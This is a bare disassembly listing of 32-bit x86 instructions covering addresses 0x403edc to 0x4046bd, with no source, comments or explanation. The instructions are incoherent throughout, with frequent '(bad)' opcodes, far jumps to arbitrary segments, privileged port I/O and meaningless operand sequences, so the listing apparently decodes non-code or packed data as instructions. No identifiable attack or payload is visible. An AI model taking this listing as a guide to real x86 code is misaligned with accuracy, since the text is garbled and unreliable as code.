  403edc:	jno    0x403eae
  403ede:	inc    ebx
  403edf:	fwait
  403ee0:	dec    eax
  403ee1:	jne    0x403f0a
  403ee3:	cmp    eax,ebx
  403ee5:	loop   0x403ede
  403ee7:	fcmovu st,st(3)
  403ee9:	mov    ch,0x39
  403eeb:	sub    al,ah
  403eed:	sub    dh,ah
  403eef:	pop    ebx
  403ef0:	pushf  
  403ef1:	cmp    eax,DWORD PTR [esi-0x4c7dc739]
  403ef7:	jecxz  0x403f12
  403ef9:	mov    ebp,DWORD PTR [ecx+0x55]
  403efc:	pusha  
  403efd:	mov    bl,0x3e
  403eff:	sbb    al,BYTE PTR [edx-0x7]
  403f02:	adc    esp,esi
  403f04:	and    DWORD PTR [edx+0xa6d3d2f],ecx
  403f0a:	mov    esp,0x3e641349
  403f0f:	mov    al,ds:0x68f32211
  403f14:	jns    0x403f31
  403f16:	push   eax
  403f17:	xor    al,bh
  403f19:	xchg   ebx,eax
  403f1a:	rcl    DWORD PTR [edi],1
  403f1c:	sbb    DWORD PTR [edi+0x1f],eax
  403f1f:	push   ebx
  403f20:	repz fsub QWORD PTR [ecx+0x52e37339]
  403f27:	inc    eax
  403f28:	mov    ax,bx
  403f2b:	mov    edx,0x280852b7
  403f30:	push   cs
  403f31:	cmc    
  403f32:	stc    
  403f33:	or     eax,0x674437ca
  403f38:	xchg   ecx,eax
  403f39:	pop    ds
  403f3a:	cs imul ecx,ecx,0xffffffb1
  403f3e:	mov    eax,ds:0xb81f782e
  403f43:	(bad)  
  403f44:	xchg   esp,eax
  403f45:	jmp    0xcc02:0xe65998d6
  403f4c:	enter  0x8d9a,0xf4
  403f50:	(bad)  
  403f51:	jns    0x403f74
  403f53:	adc    al,0x14
  403f55:	mov    dh,0xbd
  403f57:	rcl    DWORD PTR [edx-0x74],0xb5
  403f5b:	mov    ds:0xf879c004,al
  403f60:	inc    esp
  403f61:	push   eax
  403f62:	xchg   ebp,eax
  403f63:	ret    0x7f25
  403f66:	dec    esi
  403f67:	dec    ebx
  403f68:	adc    ah,BYTE PTR [ecx-0x76]
  403f6b:	leave  
  403f6c:	scas   al,BYTE PTR es:[edi]
  403f6d:	mov    eax,ds:0x62bc88d1
  403f72:	sbb    BYTE PTR [edx-0x24],bh
  403f75:	sbb    DWORD PTR [esp+eiz*4+0x47],0xd0fc5256
  403f7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f7e:	push   0xacbf5f6a
  403f83:	sti    
  403f84:	sbb    BYTE PTR [ecx-0x37af43bd],dl
  403f8a:	xchg   esp,eax
  403f8b:	fnsave [esp+ebx*8]
  403f8e:	stc    
  403f8f:	mov    ebp,0x44909bd9
  403f94:	adc    eax,0xceb38bb2
  403f99:	in     al,0x24
  403f9b:	(bad)  
  403f9c:	sbb    ah,BYTE PTR [esi+0x7cb32059]
  403fa2:	inc    ebx
  403fa3:	adc    al,0xa
  403fa5:	cmp    DWORD PTR [ecx],0xffffffb1
  403fa8:	push   ss
  403fa9:	push   edi
  403faa:	push   edx
  403fab:	ficom  DWORD PTR ds:0xebfb1415
  403fb1:	inc    ebp
  403fb2:	lods   al,BYTE PTR ds:[esi]
  403fb3:	cmp    ecx,DWORD PTR [esi-0x80]
  403fb6:	stos   BYTE PTR es:[edi],al
  403fb7:	sub    al,0x8b
  403fb9:	popf   
  403fba:	(bad)  
  403fbb:	int3   
  403fbc:	sub    ebp,edi
  403fbe:	or     DWORD PTR [edx+0x5a],0x21c3791d
  403fc5:	cmp    DWORD PTR [eax-0x7d6dad28],esi
  403fcb:	push   ebp
  403fcc:	js     0x403ffc
  403fce:	shl    BYTE PTR [eax+0x32141803],cl
  403fd4:	fwait
  403fd5:	mov    BYTE PTR [ecx-0xc4ace17],ah
  403fdb:	add    bh,BYTE PTR [ebp-0x1]
  403fde:	xchg   ecx,eax
  403fdf:	loopne 0x403fba
  403fe1:	rcr    DWORD PTR [edi],cl
  403fe3:	mov    eax,0x26285894
  403fe8:	les    ebx,FWORD PTR [ecx+edx*1+0x7f691867]
  403fef:	loop   0x403fc9
  403ff1:	imul   ecx,DWORD PTR [esi-0x75fa91c3],0xffffffa1
  403ff8:	pop    ds
  403ff9:	loope  0x403f7b
  403ffb:	repnz aaa 
  403ffd:	xlat   BYTE PTR ds:[ebx]
  403ffe:	outs   dx,DWORD PTR ds:[esi]
  403fff:	gs ja  0x404053
  404002:	mov    ?,WORD PTR [ebp-0x62]
  404005:	mov    edx,ds
  404007:	and    DWORD PTR [ecx+0x1b],esi
  40400a:	mul    BYTE PTR [ebp+ecx*4+0x22]
  40400e:	xor    BYTE PTR ss:[ebx-0x5286989],ch
  404015:	(bad)  
  404016:	shr    eax,1
  404018:	add    al,0x50
  40401a:	lods   al,BYTE PTR ds:[esi]
  40401b:	cmp    cl,bl
  40401d:	xchg   ebp,eax
  40401e:	shr    DWORD PTR [ebx+0x33],0x12
  404022:	gs out 0x78,eax
  404025:	adc    dl,BYTE PTR [eax+0x4c]
  404028:	push   ss
  404029:	mov    ah,0x41
  40402b:	and    al,0xc0
  40402d:	aas    
  40402e:	or     BYTE PTR [edi],ch
  404030:	adc    dh,dh
  404032:	nop
  404033:	sub    DWORD PTR [eax-0x41],esp
  404036:	and    esi,DWORD PTR [ebp-0x1cc95cf7]
  40403c:	inc    edi
  40403d:	std    
  40403e:	pusha  
  40403f:	jmp    0x404023
  404041:	sub    esi,DWORD PTR [edx-0x80]
  404044:	les    esi,FWORD PTR [ebp+0x2f]
  404047:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  404049:	mov    edi,0x2898e02c
  40404e:	mov    edi,0xa21d23cf
  404053:	loop   0x40408d
  404055:	jp     0x404023
  404057:	jge    0x40401b
  404059:	scas   eax,DWORD PTR es:[edi]
  40405a:	jne    0x4040b0
  40405c:	cmp    BYTE PTR [ecx-0x6a],dh
  40405f:	(bad)  
  404060:	fistp  DWORD PTR [ecx+edx*2-0x25]
  404064:	sbb    al,BYTE PTR [ecx]
  404066:	xor    esi,DWORD PTR [ebx+0x2a9fdf9b]
  40406c:	mov    cl,0xaa
  40406e:	xor    BYTE PTR [ebx],ah
  404070:	(bad)  
  404072:	int    0xbb
  404074:	aas    
  404075:	inc    ecx
  404076:	ds rol eax,1
  404079:	push   eax
  40407a:	aas    
  40407b:	aaa    
  40407c:	cmp    BYTE PTR [ebp-0x17],0x6d
  404080:	pop    eax
  404081:	pop    ds
  404082:	and    eax,0x255f58be
  404087:	add    edx,DWORD PTR [edx]
  404089:	cmp    bh,BYTE PTR [esi+0x75cca41d]
  40408f:	push   ecx
  404090:	cdq    
  404091:	push   0x41
  404093:	in     eax,0xb2
  404095:	xor    edx,DWORD PTR [edx]
  404097:	call   0xa54:0x4ec92d8f
  40409e:	in     al,0x1
  4040a0:	cli    
  4040a1:	arpl   WORD PTR [ebx],bp
  4040a3:	lock dec ebx
  4040a5:	std    
  4040a6:	shr    esp,1
  4040a8:	xor    BYTE PTR [ebx],cl
  4040aa:	stc    
  4040ab:	cmc    
  4040ac:	pop    ebx
  4040ad:	pushf  
  4040ae:	push   ds
  4040af:	aas    
  4040b0:	xor    ebx,ecx
  4040b2:	ja     0x404065
  4040b4:	in     al,0xfe
  4040b6:	clc    
  4040b7:	cdq    
  4040b8:	jnp    0x40407c
  4040ba:	jecxz  0x4040a4
  4040bc:	sub    ebx,esi
  4040be:	jno    0x404136
  4040c0:	dec    edx
  4040c1:	or     ch,dh
  4040c3:	aaa    
  4040c4:	ss adc eax,0x1ea5d166
  4040ca:	pop    ds
  4040cb:	mov    esi,0x775a454d
  4040d0:	in     al,0xeb
  4040d2:	mov    eax,0x47bcf1ff
  4040d7:	iret   
  4040d8:	addr16 dec ebx
  4040da:	jg     0x4040fa
  4040dc:	fidivr DWORD PTR [edi+ecx*4-0x5dcbb2f8]
  4040e3:	mov    ch,0xc9
  4040e5:	xor    eax,0xbb6e91a7
  4040ea:	das    
  4040eb:	into   
  4040ec:	sub    dl,BYTE PTR [edx+edx*8+0x3a]
  4040f0:	daa    
  4040f1:	(bad)  
  4040f2:	rcl    BYTE PTR [edi],cl
  4040f4:	xchg   DWORD PTR [edx-0x62],esi
  4040f7:	fisub  WORD PTR [ebx+0xace0062]
  4040fd:	xchg   DWORD PTR [esi-0x30034cbc],ebp
  404103:	imul   ebp,DWORD PTR [esi+0x4d],0x32ff6884
  40410a:	mov    bl,0xf9
  40410c:	cwde   
  40410d:	and    BYTE PTR [eax-0x261bf608],cl
  404113:	sahf   
  404114:	imul   esi,DWORD PTR ss:[edi-0x5c],0x4d6379a2
  40411c:	pop    edi
  40411d:	imul   ecx,DWORD PTR [ebx+edx*1+0x1d],0x56
  404122:	xchg   ebx,eax
  404123:	ret    0x51ff
  404126:	mov    ebx,0x645b05a0
  40412b:	enter  0x3e4f,0xfa
  40412f:	fdiv   DWORD PTR [eax-0x56]
  404132:	or     ah,BYTE PTR [ecx]
  404134:	inc    esi
  404135:	loope  0x4040c1
  404137:	push   ds
  404138:	je     0x404140
  40413a:	push   edx
  40413b:	gs pop ss
  40413d:	mov    ebx,0x66699a43
  404142:	xor    eax,0x201364c8
  404147:	or     BYTE PTR [edx],ch
  404149:	mov    esp,0xaaad28fd
  40414e:	das    
  40414f:	imul   edi,ebx,0x4bc7d7be
  404155:	(bad)  [ebp+ebp*8-0x6e]
  40415a:	inc    eax
  40415b:	retf   
  40415c:	mov    eax,0xe5b804dc
  404162:	aad    0xc3
  404164:	ret    
  404165:	mov    WORD PTR [edi+0x5728e033],gs
  40416b:	xor    eax,0x570af040
  404170:	clc    
  404171:	cdq    
  404172:	lods   eax,DWORD PTR ds:[esi]
  404173:	cs pop ebx
  404175:	or     BYTE PTR [esi+0x7f1a5943],bh
  40417b:	or     eax,edx
  40417d:	sub    BYTE PTR [eax],bh
  40417f:	popf   
  404180:	and    al,0x5d
  404182:	arpl   WORD PTR [edx+0x646ff9ad],ax
  404188:	mov    esp,0x5c9724d
  40418d:	mov    esp,0xff16554c
  404192:	sub    dl,ch
  404194:	icebp  
  404195:	sub    eax,0xe63866f2
  40419a:	xlat   BYTE PTR ds:[ebx]
  40419b:	xor    BYTE PTR [eax-0xa],bh
  40419e:	test   DWORD PTR [ebx],0x142d249e
  4041a4:	dec    ecx
  4041a5:	shl    BYTE PTR [ebp-0x19b0433d],1
  4041ab:	mov    dl,0x22
  4041ad:	dec    ecx
  4041ae:	dec    eax
  4041af:	mov    ?,WORD PTR [edx+0x3f29396d]
  4041b5:	mul    eax
  4041b7:	dec    ecx
  4041b8:	xchg   edx,eax
  4041b9:	mov    ds:0x67624cc7,al
  4041be:	sbb    BYTE PTR [ebp-0x30],ah
  4041c1:	cld    
  4041c2:	out    dx,eax
  4041c3:	dec    edi
  4041c4:	fild   WORD PTR [ebp-0x2c]
  4041c7:	xchg   ebp,eax
  4041c8:	loopne 0x404176
  4041ca:	or     eax,0xdfba83df
  4041cf:	sahf   
  4041d0:	pop    ebx
  4041d1:	sub    esp,DWORD PTR [esi-0x485880e3]
  4041d7:	mov    ecx,0xf8d174d0
  4041dc:	mov    al,ds:0x410fa3ee
  4041e1:	nop
  4041e2:	outs   dx,DWORD PTR ds:[esi]
  4041e3:	int    0x40
  4041e5:	dec    eax
  4041e6:	inc    edi
  4041e7:	fcomp  st(2)
  4041e9:	jge    0x4041e3
  4041eb:	add    esi,0xd12fd782
  4041f1:	dec    edx
  4041f2:	mov    edi,0xce0299d
  4041f7:	ret    0x2d95
  4041fa:	mov    dl,BYTE PTR [edi]
  4041fc:	scas   al,BYTE PTR es:[edi]
  4041fd:	(bad)  
  4041fe:	sub    bl,BYTE PTR [esi]
  404200:	mov    al,ds:0x34e0239f
  404205:	call   0xbec1cb63
  40420a:	fwait
  40420b:	push   ebp
  40420c:	lock pusha 
  40420e:	pop    edi
  40420f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404210:	and    eax,DWORD PTR [esp+esi*2+0x7b]
  404214:	pushf  
  404215:	xchg   edi,eax
  404216:	inc    esp
  404217:	pop    ebx
  404218:	and    bh,dh
  40421a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40421b:	mov    esp,0xb86594a2
  404220:	xor    BYTE PTR [edi-0x4cb90c0d],ch
  404226:	pop    es
  404227:	aam    0x96
  404229:	mov    ah,0x84
  40422b:	test   al,0x29
  40422d:	jo     0x40428e
  40422f:	(bad)  
  404230:	dec    ebp
  404231:	sbb    eax,0xc54bdeaa
  404236:	sub    BYTE PTR [edx],bh
  404238:	sub    al,0x64
  40423a:	into   
  40423b:	mov    bh,0xc8
  40423d:	xchg   esp,eax
  40423e:	outs   dx,BYTE PTR ds:[esi]
  40423f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404240:	pop    eax
  404241:	stc    
  404242:	aaa    
  404243:	xchg   esp,eax
  404244:	in     al,0x65
  404246:	repz or DWORD PTR [ecx-0x1bfc706a],esp
  40424d:	ficom  WORD PTR [edi+eax*1+0x14f2ef01]
  404254:	or     BYTE PTR [ebx-0x47],ch
  404257:	sbb    BYTE PTR [eax-0x1e],cl
  40425a:	jmp    0xfb2f:0xe0892a5c
  404261:	sbb    bh,BYTE PTR [ebx]
  404263:	inc    esp
  404264:	rcr    DWORD PTR [eax],1
  404266:	call   0x629a56e9
  40426b:	cmp    dh,BYTE PTR [ebp-0x7]
  40426e:	inc    ecx
  40426f:	sar    bh,1
  404271:	fdivr  DWORD PTR [esi]
  404273:	mov    ah,0x39
  404275:	pop    DWORD PTR [esi+0x753029c6]
  40427b:	imul   edx,eax,0xf3120f5b
  404281:	mov    BYTE PTR [eax+0x3ada420b],0xee
  404288:	jg     0x4042d8
  40428a:	push   eax
  40428b:	ret    
  40428c:	xor    eax,0x186edf98
  404291:	and    dl,BYTE PTR [edx+0x27864fa1]
  404297:	test   eax,0xfe1d3364
  40429c:	fistp  DWORD PTR [ebx]
  40429e:	aaa    
  40429f:	(bad)  
  4042a1:	in     al,dx
  4042a2:	fidiv  DWORD PTR [esp+edi*8+0x5803393f]
  4042a9:	int    0x14
  4042ab:	sar    BYTE PTR [ecx+0x4b9d49bb],cl
  4042b1:	add    DWORD PTR [ebp+0x74aff81],edi
  4042b7:	push   0xffffff97
  4042b9:	fiadd  DWORD PTR [edi]
  4042bb:	in     eax,0x2d
  4042bd:	add    al,0x23
  4042bf:	in     al,dx
  4042c0:	sub    eax,0x6751a727
  4042c5:	pop    es
  4042c6:	fisubr DWORD PTR [esi+0x74]
  4042c9:	jmp    0x404316
  4042cb:	push   ebx
  4042cc:	mov    ebp,?
  4042ce:	xor    cl,BYTE PTR [edi]
  4042d0:	xor    edx,DWORD PTR [ebx]
  4042d2:	aam    0xee
  4042d4:	mov    al,ds:0x8ed5405a
  4042d9:	jp     0x4042cf
  4042db:	cmp    eax,0x569bd928
  4042e0:	stos   BYTE PTR es:[edi],al
  4042e1:	ror    DWORD PTR [edi+0x6f1c7b3c],1
  4042e7:	pusha  
  4042e8:	lods   al,BYTE PTR ds:[esi]
  4042e9:	(bad)  
  4042ea:	outs   dx,DWORD PTR ds:[esi]
  4042eb:	pop    ss
  4042ec:	or     bl,BYTE PTR [esi]
  4042ee:	push   ds
  4042ef:	lods   al,BYTE PTR ds:[esi]
  4042f0:	mov    eax,esi
  4042f2:	dec    esp
  4042f3:	dec    ebp
  4042f4:	sbb    cl,ch
  4042f6:	fwait
  4042f7:	stos   DWORD PTR es:[edi],eax
  4042f8:	mov    al,ds:0xb2a002cc
  4042fd:	pop    edx
  4042fe:	ror    BYTE PTR [edx+0x7717094c],0x0
  404305:	pop    ebx
  404306:	pop    es
  404307:	jnp    0x40433e
  404309:	call   0x5fe7be0d
  40430e:	mov    ebp,0xf4ecc961
  404313:	aad    0xee
  404315:	add    DWORD PTR [edi],ebx
  404317:	aad    0xa5
  404319:	stos   DWORD PTR es:[edi],eax
  40431a:	mov    al,0xbb
  40431c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40431d:	dec    edx
  40431e:	or     eax,0xb6e34270
  404323:	or     dh,BYTE PTR ds:0x58c0c438
  404329:	jnp    0x4042e2
  40432b:	cmp    eax,0x8a561bb8
  404330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404331:	xor    BYTE PTR [edi+eax*8-0x1b],ch
  404335:	sahf   
  404336:	sahf   
  404337:	aam    0xa3
  404339:	hlt    
  40433a:	mov    al,0xcc
  40433c:	xor    eax,0x801b6c4a
  404341:	cld    
  404342:	lahf   
  404343:	add    bh,BYTE PTR [ebx-0x11]
  404346:	std    
  404347:	mov    ss,ebp
  404349:	fwait
  40434a:	mov    bh,0x3b
  40434c:	pop    esp
  40434d:	mov    ebx,0xaf3076cb
  404352:	in     al,0xa7
  404354:	and    eax,0x9ca438e
  404359:	mov    fs,WORD PTR [ecx+0x3b]
  40435c:	mov    ch,0x8c
  40435e:	xlat   BYTE PTR ds:[ebx]
  40435f:	rcr    BYTE PTR [ebx],0x42
  404362:	adc    esp,esp
  404364:	sub    eax,0x3c8cd56e
  404369:	xor    al,0x90
  40436b:	sbb    eax,0xe27694d1
  404370:	out    dx,al
  404371:	setns  dl
  404374:	push   esp
  404375:	jecxz  0x40438f
  404377:	push   ss
  404378:	jmp    0x4014:0xc1167440
  40437f:	cmp    al,0x7a
  404381:	bound  ecx,QWORD PTR [esi-0x78]
  404384:	call   0xe6baadb6
  404389:	push   0x69e4c652
  40438e:	inc    edx
  40438f:	and    DWORD PTR [ecx],esp
  404391:	out    0xa4,al
  404393:	xchg   BYTE PTR [edi+0x5ea1dc1b],dh
  404399:	xchg   edi,eax
  40439a:	jmp    0x40441b
  40439c:	outs   dx,DWORD PTR ds:[esi]
  40439d:	xchg   ebx,eax
  40439e:	imul   edx,DWORD PTR ds:0xb40b936f,0x5a
  4043a5:	inc    edi
  4043a6:	retf   
  4043a7:	jge    0x4043e9
  4043a9:	aam    0xfa
  4043ab:	sub    DWORD PTR [edx+0x533a2409],edx
  4043b1:	pop    ecx
  4043b2:	mov    edi,0xdd3e4f2d
  4043b7:	xchg   ebp,eax
  4043b8:	in     eax,dx
  4043b9:	mov    edx,0xb511d693
  4043be:	jecxz  0x404375
  4043c0:	lods   eax,DWORD PTR ds:[esi]
  4043c1:	repnz push 0xffffffca
  4043c4:	out    0x8,al
  4043c6:	into   
  4043c7:	xor    DWORD PTR [ebx],esi
  4043c9:	js     0x404351
  4043cb:	call   0x7961:0x1e2b7f7
  4043d2:	jmp    0xe7f8:0xe883fa5b
  4043d9:	adc    BYTE PTR [ebx+0x16af99dd],0x40
  4043e0:	jne    0x404410
  4043e2:	std    
  4043e3:	aaa    
  4043e4:	push   ds
  4043e5:	aaa    
  4043e6:	xor    eax,0xecc8f5ac
  4043eb:	add    al,0xc4
  4043ee:	addr16 (bad) 
  4043f0:	push   cs
  4043f1:	in     eax,0xc1
  4043f3:	dec    ecx
  4043f4:	cmp    BYTE PTR [esi-0x52af711b],ch
  4043fa:	pop    edi
  4043fb:	jl     0x4043da
  4043fd:	call   0x956eab3b
  404402:	adc    eax,DWORD PTR [edi+0x4c]
  404405:	stos   BYTE PTR es:[edi],al
  404406:	dec    edx
  404407:	xchg   edx,eax
  404408:	dec    ebx
  404409:	mov    bl,BYTE PTR [eax]
  40440b:	inc    ecx
  40440c:	nop
  40440d:	ins    DWORD PTR es:[edi],dx
  40440e:	dec    ebx
  40440f:	add    al,BYTE PTR [edx+0x56]
  404412:	je     0x40439d
  404414:	dec    ebp
  404415:	(bad)  
  404416:	jmp    0x5efa:0x17219925
  40441d:	aas    
  40441e:	and    eax,0x1a84d1fa
  404423:	pop    ebx
  404424:	in     eax,dx
  404425:	mov    ebp,0x46d20ead
  40442a:	xor    al,0x7f
  40442c:	jae    0x40441a
  40442e:	add    BYTE PTR [ebx-0x43555e7f],al
  404434:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404435:	shr    DWORD PTR [edx],cl
  404437:	loopne 0x404482
  404439:	mov    bh,0x8f
  40443b:	gs lock das 
  40443e:	call   0x20af:0x390fa5db
  404445:	sahf   
  404446:	das    
  404447:	ret    0x9877
  40444a:	mov    edx,eax
  40444c:	call   DWORD PTR [ebp+0x11bb63ad]
  404453:	adc    esp,DWORD PTR [edi]
  404455:	xor    BYTE PTR [esi],bl
  404457:	int3   
  404458:	push   eax
  404459:	push   ebp
  40445a:	test   eax,0xbd45e2c8
  40445f:	jmp    0x4043e6
  404461:	int3   
  404462:	cmp    dh,BYTE PTR [ebp+0x18]
  404465:	sbb    ebp,DWORD PTR [ecx]
  404467:	mov    edx,0xed338ac6
  40446c:	mov    edi,0x586f6e55
  404471:	outs   dx,DWORD PTR ds:[esi]
  404472:	mov    dl,BYTE PTR [ecx+0x7150dcb5]
  404478:	(bad)  
  404479:	push   eax
  40447a:	stos   DWORD PTR es:[edi],eax
  40447b:	iret   
  40447c:	pop    ebx
  40447d:	xor    ch,BYTE PTR [edi+ebp*8-0x5e]
  404481:	dec    edx
  404482:	test   al,0xa2
  404484:	dec    eax
  404485:	dec    eax
  404486:	jne    0x404426
  404488:	adc    eax,0x4b6b1154
  40448d:	aas    
  40448e:	adc    bh,BYTE PTR [ebx]
  404490:	frstor [edi]
  404492:	bound  esi,QWORD PTR [edx+edx*4]
  404495:	and    al,0xe
  404497:	xchg   BYTE PTR [esi-0xd],ch
  40449a:	lahf   
  40449b:	imul   BYTE PTR [esi]
  40449d:	lods   eax,DWORD PTR ds:[esi]
  40449e:	mov    ah,0x1b
  4044a0:	add    BYTE PTR [edi-0x28],dh
  4044a3:	in     al,dx
  4044a4:	cmp    BYTE PTR [ebx-0x1],0x38
  4044a8:	jae    0x404478
  4044aa:	xor    DWORD PTR [edi+edx*1-0x2bdb12e9],eax
  4044b1:	sbb    BYTE PTR [esi],al
  4044b3:	lea    esi,[esi-0x65f53dd5]
  4044b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044ba:	sbb    al,0x56
  4044bd:	jae    0x404531
  4044bf:	adc    al,0x27
  4044c1:	jp     0x404493
  4044c3:	fwait
  4044c4:	(bad)  
  4044c5:	and    al,BYTE PTR [esi]
  4044c7:	in     al,dx
  4044c8:	in     al,dx
  4044c9:	mov    al,ds:0x39afb38f
  4044ce:	fbstp  TBYTE PTR [eax+0x11e01c91]
  4044d4:	inc    eax
  4044d5:	inc    edi
  4044d6:	xor    BYTE PTR [esi-0x7e],0x21
  4044da:	cmp    eax,0x5a0510b3
  4044df:	jecxz  0x40453a
  4044e1:	pop    edi
  4044e2:	and    eax,0x9a506874
  4044e7:	push   es
  4044e8:	loop   0x404485
  4044ea:	push   ds
  4044eb:	push   eax
  4044ec:	cwde   
  4044ed:	cwde   
  4044ee:	loope  0x4044cc
  4044f0:	push   edi
  4044f1:	(bad)  
  4044f2:	jmp    0x2838:0x44d8c9d7
  4044f9:	cmp    ecx,DWORD PTR [ebp+0x57]
  4044fc:	loop   0x40449e
  4044fe:	in     eax,0x1d
  404500:	and    DWORD PTR [eax-0x1c],ecx
  404503:	push   0xf
  404505:	jne    0x4044cf
  404507:	imul   edx,DWORD PTR [eax-0xf],0x58
  40450b:	out    dx,al
  40450c:	lahf   
  40450d:	in     al,0x96
  40450f:	push   eax
  404510:	(bad)  
  404511:	push   ds
  404512:	mov    eax,0xb9262480
  404517:	add    al,0xbd
  404519:	adc    BYTE PTR [ebx+esi*4+0xb20d94b],bl
  404520:	fcmovnb st,st(7)
  404522:	jnp    0x404570
  404524:	mov    ah,0xe5
  404526:	lods   al,BYTE PTR ds:[esi]
  404527:	ds xor eax,0xf410c50c
  40452d:	bound  ecx,QWORD PTR [ecx]
  40452f:	mov    al,ds:0x41cbc3ce
  404534:	push   ebp
  404535:	in     eax,0x4b
  404537:	xor    edi,DWORD PTR [esi]
  404539:	sub    al,0xdc
  40453b:	popa   
  40453c:	adc    BYTE PTR [ebx+edi*2+0x3e],cl
  404540:	fiadd  WORD PTR [ebp+0x6ce264cd]
  404546:	out    dx,eax
  404547:	ret    
  404548:	in     al,dx
  404549:	push   eax
  40454a:	leave  
  40454b:	xchg   esp,eax
  40454c:	shl    DWORD PTR [ebp+0x55],cl
  40454f:	push   eax
  404550:	div    BYTE PTR [edx+0x6]
  404553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404554:	push   0x2b
  404556:	jmp    0xd958:0x19726aa1
  40455d:	sbb    al,0x74
  40455f:	ret    0xdf0a
  404562:	imul   ebp,ecx,0x77
  404565:	sbb    al,0xc7
  404567:	xor    BYTE PTR [edi+0xc],al
  40456a:	add    dl,bh
  40456c:	jae    0x4045e1
  40456e:	in     al,dx
  40456f:	pop    ds
  404570:	or     DWORD PTR [eax+edi*2+0x4f],edi
  404574:	outs   dx,DWORD PTR ds:[esi]
  404575:	pushf  
  404576:	push   cs
  404577:	jp     0x404561
  404579:	mov    es,eax
  40457b:	pop    ss
  40457c:	loopne 0x4045b3
  40457e:	sub    eax,esi
  404580:	xor    al,0xd7
  404582:	mov    al,ds:0x33ab694
  404587:	add    esp,edi
  404589:	dec    esi
  40458a:	loope  0x40450e
  40458c:	xchg   ecx,eax
  40458d:	lock pop edx
  40458f:	add    bl,dh
  404591:	pop    ebp
  404592:	adc    DWORD PTR [edx],0x6c9c5f11
  404598:	mov    bh,ah
  40459a:	outs   dx,DWORD PTR ds:[esi]
  40459b:	cmp    BYTE PTR gs:[ebx+esi*1],al
  40459f:	int3   
  4045a0:	inc    esi
  4045a1:	inc    ecx
  4045a2:	outs   dx,DWORD PTR ds:[esi]
  4045a3:	ds sahf 
  4045a5:	cmp    al,ah
  4045a7:	(bad)  
  4045a8:	mov    al,0xe4
  4045aa:	mov    dh,0x9f
  4045ac:	xchg   DWORD PTR ds:0xd35de3b0,ecx
  4045b2:	lds    edx,FWORD PTR [edx]
  4045b4:	inc    esp
  4045b5:	sbb    BYTE PTR [ecx+0x3e],ah
  4045b8:	pop    ebx
  4045b9:	lahf   
  4045ba:	outs   dx,DWORD PTR ds:[esi]
  4045bb:	pusha  
  4045bc:	add    al,0x1a
  4045be:	cmp    BYTE PTR [ebx-0x52],0x8b
  4045c2:	mov    ebx,0x9be344ca
  4045c7:	inc    esp
  4045c8:	mov    ds:0xa3c53b04,eax
  4045cd:	nop
  4045ce:	xor    DWORD PTR [ebx+0x4970b213],0x87bf2d61
  4045d8:	cmc    
  4045d9:	ss ds dec esi
  4045dc:	push   esi
  4045dd:	sbb    DWORD PTR fs:[ebp+0x4e],0xffffffd0
  4045e2:	push   ds
  4045e3:	shl    BYTE PTR [ebx-0x6e47cf23],1
  4045e9:	stos   BYTE PTR es:[edi],al
  4045ea:	out    0x98,al
  4045ec:	(bad)  
  4045ed:	mov    BYTE PTR [edx-0x60],dl
  4045f0:	sub    BYTE PTR [edi-0x19],ah
  4045f3:	xchg   edi,eax
  4045f4:	les    ebp,FWORD PTR [eax]
  4045f6:	jnp    0x40462e
  4045f8:	cmp    ah,ah
  4045fa:	fnstenv [esi]
  4045fc:	mov    eax,0xd477d621
  404601:	add    BYTE PTR [esi+edx*1],cl
  404604:	sub    al,0xbe
  404606:	repz and DWORD PTR [edx-0x72],0x3cf30675
  40460e:	outs   dx,DWORD PTR ds:[esi]
  40460f:	mov    DWORD PTR [ecx+0x6c8f969f],eax
  404615:	jl     0x404628
  404617:	xchg   ebx,edx
  404619:	xor    DWORD PTR [edi-0x206f1fe8],edi
  40461f:	ret    0x5aa3
  404622:	sti    
  404623:	(bad)
  404627:	stos   BYTE PTR es:[edi],al
  404628:	nop
  404629:	push   ss
  40462a:	mov    dh,BYTE PTR [di]
  40462d:	icebp  
  40462e:	mov    ds:0xc8b17512,al
  404633:	rcl    BYTE PTR [ecx+0x3],cl
  404636:	in     al,dx
  404637:	adc    DWORD PTR [edx+ecx*1+0x73c244f9],ecx
  40463e:	xchg   esp,eax
  40463f:	rol    BYTE PTR [esi],1
  404641:	loopne 0x404628
  404643:	stos   BYTE PTR es:[edi],al
  404644:	inc    ebx
  404645:	sar    esi,1
  404647:	div    ebp
  404649:	xor    BYTE PTR [ecx+0x7],dh
  40464c:	jne    0x4046c2
  40464e:	imul   edx,eax,0x7064a2ac
  404654:	jo     0x4045e9
  404656:	(bad)  
  404658:	mov    ebp,0xcc6633a3
  40465d:	cwde   
  40465e:	and    al,0x6b
  404660:	iret   
  404661:	mov    eax,ds:0xcf318d85
  404666:	les    esi,FWORD PTR [ebx]
  404668:	add    ah,ch
  40466a:	stos   BYTE PTR es:[edi],al
  40466b:	not    cl
  40466d:	dec    ecx
  40466e:	jae    0x404647
  404670:	call   0x6ee0:0x9011a4dd
  404677:	in     eax,0xa1
  404679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40467a:	dec    edx
  40467b:	daa    
  40467c:	cmp    esp,ebp
  40467e:	or     eax,0xc3535345
  404683:	mov    edi,0x2c747e91
  404688:	push   edx
  404689:	fcom   DWORD PTR [ecx+0x54e71d9d]
  40468f:	lock cs add bh,al
  404693:	or     DWORD PTR [edx-0x76],eax
  404696:	call   0x30090439
  40469b:	imul   edi,DWORD PTR [edi],0xffffffea
  40469e:	mov    ebp,0xfb724423
  4046a3:	aas    
  4046a4:	mov    ah,0xca
  4046a6:	jae    0x404690
  4046a8:	pusha  
  4046a9:	adc    DWORD PTR [ebp-0x17],eax
  4046ac:	pop    esi
  4046ad:	loop   0x4046af
  4046af:	dec    edi
  4046b0:	out    dx,al
  4046b1:	push   ss
  4046b2:	loope  0x404668
  4046b4:	sub    esi,esi
  4046b6:	mov    ebx,0x9a60cc95
  4046bb:	outs   dx,BYTE PTR ds:[esi]
  4046bc:	outs   dx,BYTE PTR ds:[esi]
  4046bd:	hlt    
